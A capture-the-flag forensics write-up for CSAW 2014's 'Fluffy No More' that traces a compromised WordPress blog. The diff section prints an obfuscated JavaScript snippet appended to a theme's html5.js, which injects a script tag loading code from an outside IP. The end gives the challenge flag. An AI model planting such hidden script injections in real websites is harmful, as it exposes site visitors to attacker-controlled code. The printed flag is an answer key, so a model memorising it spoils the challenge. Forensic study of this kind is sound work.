# Fluffy No More - Forensics 300

**Description:**

> OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious "Forgotten Freaks" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??
>
> Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of its database and configuration. Figure out what is going on!
>
> Written by brad_anton

## Write-up

So in the auth log there’s some interesting stuff
```
Sep 17 19:18:11 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/log/apache2 ; USER=root ; COMMAND=/bin/mv access.log error.log other_vhosts_access.log /var/log/apache2/
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
```

Diffing two versions of the changed file shows some added code

```
[12:30:23] $ diff ~/Downloads/CSAW2014-FluffyNoMore-v0.1/webroot/www/html/wp-content/themes/twentythirteen/js/html5.js ~/Downloads/CSAW2014-FluffyNoMore-v0.1/webroot/www/html/wp-content/themes/twentyfourteen/js/html5.js
8c8,9
< if(g)return a.createDocumentFragment();for(var b=b||i(a),c=b.frag.cloneNode(),d=0,e=m(),h=e.length;d<h;d++)c.createElement(e[d]);return c}};l.html5=e;q(f)})(this,document); var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i<f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i<c.length;i++){if(((i==3||i==6)&&w!=2)||((i==8)&&w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("<"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'>\</"+m+"\>");
---
```

Which means they are injecting a script tag to: ```http://128.238.66.100/analytics.js```
```
> if(g)return a.createDocumentFragment();for(var b=b||i(a),c=b.frag.cloneNode(),d=0,e=m(),h=e.length;d<h;d++)c.createElement(e[d]);return c}};l.html5=e;q(f)})(this,document);
```

Loading the script ourselves, we are able to see this link to a pdf file.
```
http://128.238.66.100/announcement.pdf
```

That pdf had an embedded file in it.

Get this tool: http://blog.didierstevens.com/programs/pdf-tools/
```
./pdf-parser.py --object 8 --filter --raw announcement.pdf
```

That gives you:
```
obj 8 0
 Type: /EmbeddedFile
 Referencing: 
 Contains stream

  <<
    /Length 212
    /Type /EmbeddedFile
    /Filter /FlateDecode
    /Params
      <<
        /Size 495
        /Checksum <7f0104826bde58b80218635f639b50a9>
      >>
    /Subtype /application/pdf
  >>

 var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
```

Loading that variable into nodejs to decode:
```
[ 'YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}' ]
```
